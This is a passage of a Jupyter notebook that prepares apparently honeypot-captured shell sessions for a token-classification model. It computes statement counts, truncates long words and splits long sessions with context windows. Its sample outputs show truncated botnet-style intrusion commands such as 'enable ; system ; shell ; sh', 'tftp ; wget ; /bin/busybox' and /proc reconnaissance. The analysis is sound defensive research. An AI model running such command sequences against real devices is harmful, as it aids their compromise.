       "      <td>[8, 8, 7, 4, 18, 20, 13, 9, 17, 20, 6, 6, 20, ...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        full_session  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "1  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "\n",
       "                   first_timestamp        sensor        date  len_sessions  \\\n",
       "0 2019-06-04 09:45:11.151186+00:00  eea5dc653b37  2019-06-04            62   \n",
       "1 2019-06-04 09:45:50.396610+00:00  eea5dc653b37  2019-06-04            62   \n",
       "\n",
       "   n_statements                                  char_x_statements  \n",
       "0            21  [8, 8, 7, 4, 18, 20, 13, 9, 17, 20, 6, 6, 20, ...  \n",
       "1            21  [8, 8, 7, 4, 18, 20, 13, 9, 17, 20, 6, 6, 20, ...  "
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "def obtain_statements(session):\n",
    "    statements = re.split(r'(; |\\|\\|? |&& )', session+\" \")\n",
    "    statements = [\"\".join(statements[i:i+2]).strip() for i in range(0, len(statements)-1, 2)]\n",
    "    return statements\n",
    "def obtain_char_x_statements(session):\n",
    "    statements = re.split(r'(; |\\|\\|? |&& )', session+\" \")\n",
    "    statements = [\"\".join(statements[i:i+2]).strip() for i in range(0, len(statements)-1, 2)]\n",
    "    return [len(statement) for statement in statements]\n",
    "\n",
    "# Only keep rows in which sessions exist\n",
    "print(f\"Before filtering: {unique_inference_corpus.shape[0]}\")\n",
    "unique_inference_corpus[\"len_sessions\"] = unique_inference_corpus[\"full_session\"].progress_apply(lambda session: len(session.split(\" \")))\n",
    "unique_inference_corpus[\"n_statements\"] = unique_inference_corpus[\"full_session\"].progress_apply(lambda session: len(obtain_statements(str(session))))\n",
    "unique_inference_corpus[\"char_x_statements\"] = unique_inference_corpus[\"full_session\"].progress_apply(lambda session: obtain_char_x_statements(str(session)))\n",
    "nan_in_chars = unique_inference_corpus[\"char_x_statements\"].progress_apply(lambda char_x_statements: np.isnan(char_x_statements).any())\n",
    "unique_inference_corpus = unique_inference_corpus[~nan_in_chars]\n",
    "unique_inference_corpus = unique_inference_corpus.dropna()\n",
    "print(f\"After filtering: {unique_inference_corpus.shape[0]}\")\n",
    "unique_inference_corpus.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "00ef5f64-dfbc-4984-b9aa-8870b1cfd672",
   "metadata": {},
   "source": [
    "#### Import training corpus"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "0889a5cc-90de-4fd6-9c08-92b5e71f3cfc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Dataset contains 597 elements\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>session</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>which awk ; echo 6z18a0jzqrz1 ; echo xo093rp7m...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>ps -x ; ps -x ; cat /proc/cpuinfo ;</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             session\n",
       "0  which awk ; echo 6z18a0jzqrz1 ; echo xo093rp7m...\n",
       "1                ps -x ; ps -x ; cat /proc/cpuinfo ;"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import ast\n",
    "PATH = \"../Training/Supervised/\"\n",
    "df_labels = pd.read_csv(f\"{PATH}token_classification.csv\")\n",
    "print(f\"Dataset contains {df_labels.shape[0]} elements\")\n",
    "df_labels[\"session\"] = df_labels[\"tokenized_session\"].apply(lambda list_words: \" \".join(ast.literal_eval(list_words)))\n",
    "df_labels[[\"session\"]].head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "4c5c2f9e-abe9-471c-a525-17de79719b65",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 597/597 [00:00<00:00, 120188.13it/s]\n",
      "100%|██████████| 597/597 [00:00<00:00, 102757.69it/s]\n",
      "100%|██████████| 597/597 [00:00<00:00, 93548.01it/s]\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>session</th>\n",
       "      <th>len_sessions</th>\n",
       "      <th>n_statements</th>\n",
       "      <th>char_x_statements</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>which awk ; echo 6z18a0jzqrz1 ; echo xo093rp7m...</td>\n",
       "      <td>34</td>\n",
       "      <td>10</td>\n",
       "      <td>[11, 19, 19, 27, 16, 11, 19, 19, 27, 16]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>ps -x ; ps -x ; cat /proc/cpuinfo ;</td>\n",
       "      <td>9</td>\n",
       "      <td>3</td>\n",
       "      <td>[7, 7, 19]</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             session  len_sessions  \\\n",
       "0  which awk ; echo 6z18a0jzqrz1 ; echo xo093rp7m...            34   \n",
       "1                ps -x ; ps -x ; cat /proc/cpuinfo ;             9   \n",
       "\n",
       "   n_statements                         char_x_statements  \n",
       "0            10  [11, 19, 19, 27, 16, 11, 19, 19, 27, 16]  \n",
       "1             3                                [7, 7, 19]  "
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_labels = df_labels[[\"session\"]]\n",
    "df_labels[\"len_sessions\"] = df_labels[\"session\"].progress_apply(lambda session: len(session.split(\" \")))\n",
    "df_labels[\"n_statements\"] = df_labels[\"session\"].progress_apply(lambda session: len(obtain_statements(session)))\n",
    "df_labels[\"char_x_statements\"] = df_labels[\"session\"].progress_apply(lambda session: obtain_char_x_statements(session))\n",
    "\n",
    "df_labels.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ccaa6acb-ef7e-49f3-8072-d124b789288b",
   "metadata": {},
   "source": [
    "#### Compare the two dataframes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "828ff1cb-51e2-48de-a7f9-07f429436cc2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>len_sessions</th>\n",
       "      <th>n_statements</th>\n",
       "      <th>char_x_statements</th>\n",
       "      <th>len_sessions</th>\n",
       "      <th>n_statements</th>\n",
       "      <th>char_x_statements</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>count</th>\n",
       "      <td>597.00</td>\n",
       "      <td>597.00</td>\n",
       "      <td>6870.00</td>\n",
       "      <td>233037.00</td>\n",
       "      <td>233037.00</td>\n",
       "      <td>8547818.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>mean</th>\n",
       "      <td>41.17</td>\n",
       "      <td>11.51</td>\n",
       "      <td>19.34</td>\n",
       "      <td>120.81</td>\n",
       "      <td>36.68</td>\n",
       "      <td>26.67</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>std</th>\n",
       "      <td>24.77</td>\n",
       "      <td>6.69</td>\n",
       "      <td>15.50</td>\n",
       "      <td>87.74</td>\n",
       "      <td>22.96</td>\n",
       "      <td>366.31</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>min</th>\n",
       "      <td>2.00</td>\n",
       "      <td>1.00</td>\n",
       "      <td>3.00</td>\n",
       "      <td>2.00</td>\n",
       "      <td>1.00</td>\n",
       "      <td>1.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25%</th>\n",
       "      <td>17.00</td>\n",
       "      <td>4.00</td>\n",
       "      <td>10.00</td>\n",
       "      <td>116.00</td>\n",
       "      <td>35.00</td>\n",
       "      <td>8.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50%</th>\n",
       "      <td>49.00</td>\n",
       "      <td>14.00</td>\n",
       "      <td>13.00</td>\n",
       "      <td>116.00</td>\n",
       "      <td>35.00</td>\n",
       "      <td>11.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>75%</th>\n",
       "      <td>61.00</td>\n",
       "      <td>18.00</td>\n",
       "      <td>24.00</td>\n",
       "      <td>138.00</td>\n",
       "      <td>42.00</td>\n",
       "      <td>23.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>max</th>\n",
       "      <td>85.00</td>\n",
       "      <td>18.00</td>\n",
       "      <td>189.00</td>\n",
       "      <td>34404.00</td>\n",
       "      <td>8974.00</td>\n",
       "      <td>73414.00</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       len_sessions  n_statements  char_x_statements  len_sessions  \\\n",
       "count        597.00        597.00            6870.00     233037.00   \n",
       "mean          41.17         11.51              19.34        120.81   \n",
       "std           24.77          6.69              15.50         87.74   \n",
       "min            2.00          1.00               3.00          2.00   \n",
       "25%           17.00          4.00              10.00        116.00   \n",
       "50%           49.00         14.00              13.00        116.00   \n",
       "75%           61.00         18.00              24.00        138.00   \n",
       "max           85.00         18.00             189.00      34404.00   \n",
       "\n",
       "       n_statements  char_x_statements  \n",
       "count     233037.00         8547818.00  \n",
       "mean          36.68              26.67  \n",
       "std           22.96             366.31  \n",
       "min            1.00               1.00  \n",
       "25%           35.00               8.00  \n",
       "50%           35.00              11.00  \n",
       "75%           42.00              23.00  \n",
       "max         8974.00           73414.00  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "description_len_inference = unique_inference_corpus[\"len_sessions\"].describe()\n",
    "description_len_training = df_labels[\"len_sessions\"].describe()\n",
    "\n",
    "description_stats_inference = unique_inference_corpus[\"n_statements\"].describe()\n",
    "description_stats_training = df_labels[\"n_statements\"].describe()\n",
    "\n",
    "description_char_x_stats_inference = unique_inference_corpus[\"char_x_statements\"].explode().dropna().astype(int).describe()\n",
    "description_char_x_stats_training = df_labels[\"char_x_statements\"].explode().astype(int).describe()\n",
    "\n",
    "len_and_stats_and_chars = pd.concat([description_len_training, description_stats_training, description_char_x_stats_training,  \n",
    "                           description_len_inference, description_stats_inference, description_char_x_stats_inference], axis=1)\n",
    "len_and_stats_and_chars = len_and_stats_and_chars.round(2)\n",
    "display(len_and_stats_and_chars)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "a75c0281-bfab-418a-9106-d30100983c94",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 504x360 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt \n",
    "\n",
    "fig, axs = plt.subplots(1, figsize=(7,5))\n",
    "fontsize = 20\n",
    "\n",
    "axs.scatter(unique_inference_corpus.n_statements, unique_inference_corpus.len_sessions, s = 20, label = \"New inference\", c = \"limegreen\")\n",
    "axs.scatter(df_labels.n_statements, df_labels.len_sessions, s = 20, label = \"Training\")\n",
    "axs.set_title(f\"|Statements| vs |Words|\\nper session\", fontsize = fontsize + 2)\n",
    "axs.set_xlabel(\"|Statements|\\nper session\", fontsize = fontsize)\n",
    "axs.set_ylabel(\"|Words|\\nper session\", fontsize = fontsize)\n",
    "axs.yaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.xaxis.set_tick_params(labelsize=fontsize, rotation = 30) \n",
    "lgnd = axs.legend(loc = \"upper left\", scatterpoints=1, fontsize = fontsize - 3)\n",
    "\n",
    "axs.grid()\n",
    "axs.set_xscale(\"log\")\n",
    "axs.set_yscale(\"log\")\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2980aa0c-c8ed-48ca-85bb-316737bfba8e",
   "metadata": {},
   "source": [
    "### Apply mitigation policy to inference dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "09c05855-36d8-4fe8-b9a5-1f9dda7905dd",
   "metadata": {
    "tags": []
   },
   "source": [
    "#### Preprocessing to truncate words longer than threshold"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "a0e36f8e-bb81-4566-a7e3-ce5e197a21d7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Chosen threshold is 35\n"
     ]
    }
   ],
   "source": [
    "threshold_characters = 35\n",
    "print(f\"Chosen threshold is {threshold_characters}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "165e0480-3df3-4c78-9e80-d59bd5c88a32",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 233037/233037 [00:03<00:00, 67237.69it/s]\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>sensor</th>\n",
       "      <th>date</th>\n",
       "      <th>len_sessions</th>\n",
       "      <th>n_statements</th>\n",
       "      <th>char_x_statements</th>\n",
       "      <th>truncated_session</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:11.151186+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04</td>\n",
       "      <td>62</td>\n",
       "      <td>21</td>\n",
       "      <td>[8, 8, 7, 4, 18, 20, 13, 9, 17, 20, 6, 6, 20, ...</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:50.396610+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04</td>\n",
       "      <td>62</td>\n",
       "      <td>21</td>\n",
       "      <td>[8, 8, 7, 4, 18, 20, 13, 9, 17, 20, 6, 6, 20, ...</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        full_session  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "1  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "\n",
       "                   first_timestamp        sensor        date  len_sessions  \\\n",
       "0 2019-06-04 09:45:11.151186+00:00  eea5dc653b37  2019-06-04            62   \n",
       "1 2019-06-04 09:45:50.396610+00:00  eea5dc653b37  2019-06-04            62   \n",
       "\n",
       "   n_statements                                  char_x_statements  \\\n",
       "0            21  [8, 8, 7, 4, 18, 20, 13, 9, 17, 20, 6, 6, 20, ...   \n",
       "1            21  [8, 8, 7, 4, 18, 20, 13, 9, 17, 20, 6, 6, 20, ...   \n",
       "\n",
       "                                   truncated_session  \n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...  \n",
       "1  enable ; system ; shell ; sh ; cat /proc/mount...  "
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "def truncate_long_words(max_length, session):\n",
    "    return \" \".join(map(lambda word: word[:max_length] if len(word) > max_length else word, session.split(\" \")))\n",
    "    \n",
    "unique_inference_corpus[\"truncated_session\"] = unique_inference_corpus[\"full_session\"].progress_apply(lambda session: truncate_long_words(threshold_characters, session))\n",
    "unique_inference_corpus.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a5d2731-0b60-4c0f-b74d-01b16a4505c4",
   "metadata": {},
   "source": [
    "#### Handle long statements"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "8386060b-baa2-42bc-8eb8-5eb172528090",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sessions will be splitted if > 14 statements.\n",
      "4 statements will be added as a context for those cases\n"
     ]
    }
   ],
   "source": [
    "threshold_n_stats = 14\n",
    "context_n_stats = 4\n",
    "print(f\"Sessions will be splitted if > {threshold_n_stats} statements.\\n{context_n_stats} statements will be added as a context for those cases\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e9a7e3e1-eb3e-429b-b56a-75c76044a32f",
   "metadata": {},
   "source": [
    "#### Before dividing, create session id"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "ca896f75-e638-4d52-b529-0248f72d09c4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>sensor</th>\n",
       "      <th>date</th>\n",
       "      <th>len_sessions</th>\n",
       "      <th>n_statements</th>\n",
       "      <th>char_x_statements</th>\n",
       "      <th>truncated_session</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:11.151186+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04</td>\n",
       "      <td>62</td>\n",
       "      <td>21</td>\n",
       "      <td>[8, 8, 7, 4, 18, 20, 13, 9, 17, 20, 6, 6, 20, ...</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        full_session  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "\n",
       "                   first_timestamp        sensor        date  len_sessions  \\\n",
       "0 2019-06-04 09:45:11.151186+00:00  eea5dc653b37  2019-06-04            62   \n",
       "\n",
       "   n_statements                                  char_x_statements  \\\n",
       "0            21  [8, 8, 7, 4, 18, 20, 13, 9, 17, 20, 6, 6, 20, ...   \n",
       "\n",
       "                                   truncated_session  \n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...  "
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "unique_inference_corpus.head(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "e362d612-5bf8-444c-8466-3aed46fe8411",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 233037/233037 [00:08<00:00, 26844.62it/s]\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>session_id</th>\n",
       "      <th>full_session</th>\n",
       "      <th>truncated_session</th>\n",
       "      <th>sensor</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>date</th>\n",
       "      <th>n_statements</th>\n",
       "      <th>statements</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04 09:45:11.151186+00:00</td>\n",
       "      <td>2019-06-04</td>\n",
       "      <td>21</td>\n",
       "      <td>[enable ;, system ;, shell ;, sh ;, cat /proc/...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04 09:45:50.396610+00:00</td>\n",
       "      <td>2019-06-04</td>\n",
       "      <td>21</td>\n",
       "      <td>[enable ;, system ;, shell ;, sh ;, cat /proc/...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   session_id                                       full_session  \\\n",
       "0           0  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "1           1  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "\n",
       "                                   truncated_session        sensor  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...  eea5dc653b37   \n",
       "1  enable ; system ; shell ; sh ; cat /proc/mount...  eea5dc653b37   \n",
       "\n",
       "                   first_timestamp        date  n_statements  \\\n",
       "0 2019-06-04 09:45:11.151186+00:00  2019-06-04            21   \n",
       "1 2019-06-04 09:45:50.396610+00:00  2019-06-04            21   \n",
       "\n",
       "                                          statements  \n",
       "0  [enable ;, system ;, shell ;, sh ;, cat /proc/...  \n",
       "1  [enable ;, system ;, shell ;, sh ;, cat /proc/...  "
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "unique_inference_corpus = unique_inference_corpus.reset_index().rename({\"index\":\"session_id\"}, axis = 1)\n",
    "if internal:\n",
    "    unique_inference_corpus = unique_inference_corpus[[\"session_id\", \"full_session\", \n",
    "                                                       \"truncated_session\", \"source_ips\", \"first_timestamp\", \"date\", \"n_statements\"]]\n",
    "else:\n",
    "    unique_inference_corpus = unique_inference_corpus[[\"session_id\", \"full_session\", \n",
    "                                                       \"truncated_session\", \"sensor\", \"first_timestamp\", \"date\", \"n_statements\"]]    \n",
    "unique_inference_corpus[\"statements\"] = unique_inference_corpus[\"truncated_session\"].progress_apply(lambda session: obtain_statements(session))\n",
    "unique_inference_corpus.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "781c12f2-979d-4106-8a3c-ae693d10f608",
   "metadata": {},
   "source": [
    "#### Function to permorm splits"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "b74f68ec-d203-44d5-b3c5-1cb725dbb4a1",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 233037/233037 [01:44<00:00, 2232.16it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Concatenating dataframes...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 771477/771477 [00:00<00:00, 1475652.38it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "After reshaping our sessions, we have 771477 rows\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sessions</th>\n",
       "      <th>session_id</th>\n",
       "      <th>order_id</th>\n",
       "      <th>indexes_statements_context</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>[17, 16, 15, 14]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>tftp ; wget ; /bin/busybox SAEMW ; dd bs=52 co...</td>\n",
       "      <td>0</td>\n",
       "      <td>2</td>\n",
       "      <td>[0, 1, 2, 3]</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            sessions  session_id  order_id  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...           0         1   \n",
       "1  tftp ; wget ; /bin/busybox SAEMW ; dd bs=52 co...           0         2   \n",
       "\n",
       "  indexes_statements_context  \n",
       "0           [17, 16, 15, 14]  \n",
       "1               [0, 1, 2, 3]  "
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "from tqdm import tqdm\n",
    "tqdm.pandas()\n",
    "\n",
    "def split_session(row, threshold, context):\n",
    "    \"\"\"Splits a session in a row if its length is greater than the threshold\"\"\"\n",
    "    statements, truncated_session, session_id, n_statements = row.statements, row.truncated_session, row.session_id, row.n_statements\n",
    "    \n",
    "    if n_statements > (threshold + context):\n",
    "        splitted_sessions, context_indeces = [], []\n",
    "        start, prev_end = 0, 0\n",
    "        end = threshold + context\n",
    "        while end <= n_statements:\n",
    "            if end == n_statements: # means that the stride has reached exactly last partition of statements\n",
    "                splitted_sessions.append(\" \".join(statements[start:]))\n",
    "                context_indeces.append([el for el in range(context)])\n",
    "            else:\n",
    "                #print(f\"\\tAppending from statement {start} to statement {end}\")\n",
    "                splitted_sessions.append(\" \".join(statements[start : end]))\n",
    "                if start == 0:\n",
    "                    context_indeces.append([el for el in range(len(statements[start : end]) - 1, len(statements[start : end]) - 1 - context, -1)])\n",
    "                else:\n",
    "                    context_indeces.append([el for el in range(context)] + [el for el in range(len(statements[start : end]) - 1, len(statements[start : end]) - 1 - context, -1)])\n",
    "            start += threshold - context\n",
    "            prev_end = end\n",
    "            end += threshold - context  \n",
    "        if prev_end != n_statements:\n",
    "            #print(f\"\\nConcatenating remaining elements from index {start} to {n_statements}\")                             \n",
    "            splitted_sessions.append(\" \".join(statements[start:]))\n",
    "            context_indeces.append([el for el in range(context)])\n",
    "        \n",
    "        split_data = pd.DataFrame({'sessions': splitted_sessions, \n",
    "                                   'session_id': [session_id] * len(splitted_sessions),\n",
    "                                   'order_id': range(1, len(splitted_sessions) + 1),\n",
    "                                   'indexes_statements_context': context_indeces})\n",
    "        return split_data\n",
    "    else:\n",
    "        split_data = pd.DataFrame({'sessions': [truncated_session],\n",
    "                                  'session_id': [session_id],\n",
    "                                  'order_id': [1],\n",
    "                                  'indexes_statements_context': [[]]})\n",
    "        return split_data    \n",
    "\n",
    "# Apply the split_string function to each row of the DataFrame\n",
    "split_data = unique_inference_corpus.progress_apply(split_session, threshold = threshold_n_stats, context = context_n_stats, axis=1)\n",
    "# Concatenate the resulting split data into a new DataFrame\n",
    "print(\"Concatenating dataframes...\")\n",
    "new_df = pd.concat(split_data.tolist(), ignore_index=True)\n",
